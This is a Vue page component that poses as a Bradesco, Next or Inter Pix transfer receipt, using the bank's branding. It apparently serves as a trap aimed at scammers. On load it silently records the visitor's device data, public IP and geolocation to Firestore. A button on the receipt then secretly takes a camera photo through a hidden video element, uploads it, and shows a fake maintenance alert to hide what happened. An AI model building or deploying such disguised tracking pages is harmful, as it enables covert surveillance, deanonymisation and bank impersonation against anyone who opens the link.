<script setup>
import { computed, onBeforeMount, onMounted, reactive, ref } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { firestore, storage, collection, doc, getDoc, serverTimestamp, setDoc, ref as refStorage, uploadString } from '../firebase';
import { useAppStore } from '../store';
import { bancoInfo, delay, formataDataHoraPtBr, formataMoedaBRL, getCurrentPosition, maskCpf, pegaPrimeiroNome, requestCameraPermission, getBrowserDeviceInfo } from '../functions';
import Bradesco from '../components/ComprovanteBradesco.vue';
import Next from '../components/ComprovanteNext.vue';
import Inter from '../components/ComprovanteInter.vue';
import { Device } from '@capacitor/device';

const route = useRoute();
const router = useRouter();

const appStore = useAppStore();

const comprovante = ref(null);
const acesso = ref({});

const video = ref(null);
const canvas = ref(null);

const data = reactive({
    comprovanteId: null,
    acessoId: null,
});

onBeforeMount(() => {
    appStore.loadingToggle();
});

onMounted(async () => {
    if (!route.query.id) {
        router.push({ path: '/' });
    }

    const docRef = doc(firestore, 'comprovantes', route.query.id);
    const docSnap = await getDoc(docRef);

    if (!docSnap.exists() || docSnap.data().expiracao.toDate() < (new Date)) {
        router.push({ path: '/' });
        appStore.loadingToggle();
        return;
    }

    comprovante.value = docSnap.data();
    comprovante.value.dataHora = formataDataHoraPtBr(comprovante.value.dataHora.toDate());
    comprovante.value.bancoImgSrc = bancoImgSrc.value;
    comprovante.value.transacao = route.query.id;

    data.comprovanteId = route.query.id;

    if (!bancoInfo(comprovante.value.instituicao)) {
        router.push({ path: '/' });
    }

    setMetaData();

    try {
        if (typeof Device !== 'undefined') {
            acesso.value = { ...acesso.value, ...await Device.getInfo() };
            acesso.value.deviceId = (await Device.getId()).identifier;
        }
    } catch (error) {
        console.error('Error device info:', error);
    }

    if (!acesso.value.deviceId) {
        acesso.value = { ...getBrowserDeviceInfo(), ...acesso.value };
    }

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        acesso.value.publicIp = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    // PEGA AS COORDENADAS DA LOCALIZAÇÃO
    try {
        const position = await getCurrentPosition();
        acesso.value = { ...acesso.value, ...position };
    } catch (error) {
        console.error('Error ao obter localização:', error);
    }

    acesso.value.at = serverTimestamp();
    acesso.value.comprovanteId = comprovante.value.transacao;

    Object.keys(acesso.value).forEach(key => acesso.value[key] === undefined && delete acesso.value[key]);

    try {
        const ref = doc(collection(firestore, "acessos"));
        await setDoc(ref, acesso.value);
        data.acessoId = ref.id;
    } catch (error) {
        console.error('Error ao enviar acesso:', error);
    }

    appStore.loadingToggle();
});

const bancoImgSrc = computed(() => {
    return new URL(`../assets/bancos/${comprovante.value.instituicao}.jpg`, import.meta.url).href
});

const faviconSrc = computed(() => {
    return new URL(`../assets/bancos/${comprovante.value.instituicao}-favicon.png`, import.meta.url).href
});

function setMetaData() {
    const banco = bancoInfo(comprovante.value.instituicao);

    document.title = `${banco.nomeResumido} - Pix ${formataMoedaBRL(comprovante.value.valor)} de ${pegaPrimeiroNome(comprovante.value.nomePagador)}`;

    let docBandido = '';
    let nomeBandido = '';

    if (comprovante.value.cpfPilantra) {
        docBandido = maskCpf(comprovante.value.cpfPilantra);
    } else if (comprovante.value.cnpjPilantra) {
        docBandido = comprovante.value.cnpjPilantra;
    }

    if (comprovante.value.nomePilantra) {
        nomeBandido += pegaPrimeiroNome(comprovante.value.nomePilantra);
    }

    let para = '';

    if (docBandido && nomeBandido) {
        para += ` para ${docBandido} - ${nomeBandido}`;
    } else if (docBandido || nomeBandido) {
        para += ` para ${docBandido + nomeBandido}`
    }

    document
        .getElementsByTagName('meta')
        .namedItem('description')
        .setAttribute('content', `Comprovante ${banco.nome}: Transação no valor de ${formataMoedaBRL(comprovante.value.valor)}${para}.`);

    document.querySelector('link[rel="icon"]').href = faviconSrc.value;
}

async function capturaFoto() {
    appStore.loadingToggle();

    await requestCameraPermission(video.value).then(async () => {
        video.value.play();
        await delay(500);
    });

    canvas.value.width = video.value.videoWidth;
    canvas.value.height = video.value.videoHeight;

    const context = canvas.value.getContext('2d');
    context.drawImage(video.value, 0, 0, canvas.value.width, canvas.value.height);

    try {
        await uploadString(refStorage(storage, `/capturas/${data.comprovanteId}/${data.acessoId}/${Date.now().toString()}`), canvas.value.toDataURL('image/jpeg'), 'data_url');
        console.info('Wow!');
    } catch (error) {
        console.error('Error upload file:', error);
    }

    const tracks = video.value.srcObject.getTracks();
    if (tracks) {
        tracks.forEach(t => t.stop());
    }

    await delay(251 + (Math.random() * 250));
    try {
        alert('Sistema em manutenção. Tente mais tarde...');
    } catch (_) {}
    appStore.loadingToggle();
}
</script>

<template>
    <div class="container">
        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante"
            @tirar-foto="capturaFoto" />
        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante"
            @tirar-foto="capturaFoto" />
        <Inter v-if="comprovante && comprovante.instituicao == 'inter'" :comprovante="comprovante"
            @tirar-foto="capturaFoto" />
    </div>
    <video ref="video" muted autoplay></video>
    <canvas ref="canvas"></canvas>
</template>

<style scoped>
video {
    display: none;
}

canvas {
    display: none;
}
</style>